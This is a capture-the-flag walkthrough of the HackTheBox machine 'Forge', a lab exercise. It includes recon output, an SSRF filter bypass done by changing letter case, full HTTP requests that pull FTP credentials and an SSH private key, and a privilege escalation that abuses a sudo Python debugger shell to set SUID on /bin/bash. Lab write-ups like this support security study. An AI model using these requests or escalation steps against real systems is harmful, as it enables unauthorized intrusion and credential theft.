# HACKTHEBOX: Forge

Any unauthenticated attacker can abuse SSRF in the forge.htb/uploads website to gain access to an internal admin page containing FTP credentials. Abusing SSRF again to access the FTP server allows the attacker to access a private SSH key. After using the SSH key to gain user acecss, run sudo on a python program to get access to root.

## Recon and Enumeration

First, start with an nmap scan. There is a filtered FTP server, an SSH server, and an HTTP server on port 80.
```
# Nmap 7.92 scan initiated Thu Dec  9 10:40:44 2021 as: nmap -A -p- --min-rate 4000 -oA forge 10.10.11.111
Nmap scan report for forge.htb (10.10.11.111)
Host is up (0.063s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open     http    Apache httpd 2.4.41
|_http-title: Gallery
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/9%OT=22%CT=1%CU=32552%PV=Y%DS=2%DC=T%G=Y%TM=61B23FC
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   62.16 ms 10.10.14.1
2   62.37 ms forge.htb (10.10.11.111)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec  9 10:41:23 2021 -- 1 IP address (1 host up) scanned in 38.73 seconds
```

The web app on port 80 has a domain name of `forge.htb`, and looks like a image galleray web app.
![forge home](screenshots/forge_home.png)

There's a link to a `/upload` page, where images can be uploaded (for example, *alterego.png*). There is also an option for an upload from URL.
![upload](screenshots/upload.png)
![upload success](screenshots/upload_success.png)

After uploading the image, visiting the provided URL confirms the correctly uploaded *alterego.png*
![gallery](screenshots/gallery.png)

This suggests Remote File Inclusion, but attempts to upload a webshell via this simple upload failed. Instead, continue reconaissance and run a `ffuf` scan to check for other virtual hosts and domains. The scan shows a successful response for `admin.forge.htb`
![ffuf](screenshots/ffuf.png)

Attempting to access http://admin.forge.htb shows that it is an internal site. Since (apparently) only localhost can access the admin page, SSRF should be tested in order to reach the admin page.

![admin fail](screenshots/admin_fail.png)

Use burp to get SSRF from the `/upload` page on `forge.htb` using the *Upload from URL* option. Attempting to access http://admin.forge.htb from http://forge.htb/upload returns an error: `URL contains a blacklisted address!`
![blacklist](screenshots/blacklist.png)

However, changing a letter from lowercase to uppercase bypasses the WAF, and the upload succeeded.
![admin success](screenshots/admin_success.png)

Follow the provided URL and read the admin page to confirm the successful SSRF vulnerability. The admin page contains two other links, `/announcements` and `/upload`.
![ssrf](screenshots/ssrf.png)

## Exploitation and user.txt
The admin page has a `/announcements` page and `/upload` page. Exploiting SSRF to read the `/announcements` page reveals 1) an ftp password of `user:heightofsecurity123!` and 2) an additional `?u=<url>` GET request parameter that supports FTP.
![burp announcements](screenshots/burp_announcements.png)
![curl announcements](screenshots/curl_announcements.png)

The following POST request allows the attacker to retrive files via FTP. Here, the post request views the contents of the current FTP directory, which contains `snap` and `user.txt`.
```
POST /upload HTTP/1.1
Host: forge.htb
Content-Length: 87
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://forge.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://forge.htb/upload
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

url=http://admin.forge.htB/upload?u=ftp://user:heightofsecurity123!@forge.htB/&remote=1
```
![homedir](screenshots/homedir.png)

The same process can be used to retrieve `.ssh/id_rsa`
```
POST /upload HTTP/1.1
Host: forge.htb
Content-Length: 98
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://forge.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://forge.htb/upload
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

url=http://admin.forge.htB/upload?u=ftp://user:heightofsecurity123!@forge.htB/.ssh/id_rsa&remote=1
```
![sshkey](screenshots/sshkey.png)

The attacker can now connect via SSH using id_rsa.
![user ssh](screenshots/userssh.png)

## Privilege Escalation and root.txt
Running `sudo -l` reveals the user can run a python script as root without a password.
![sudo list](screenshots/sudo_list.png)

Running the python script with sudo shows that it listens for a port and expects a password of `secretadminpassword`. When it recieves unexpected input, it drops a python debugging shell. tmux can be used to create multiple windows. One tmux window will be used to run the python script, and the other tmux window will be used to connect via netcat.
```
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

![privesc](screenshots/privesc.gif)

After `hello world` was entered, a python debug shell was opened in tmux window one. Here, the attacker can run arbitrary python commands. This was used to add the suid bit to `/bin/bash`
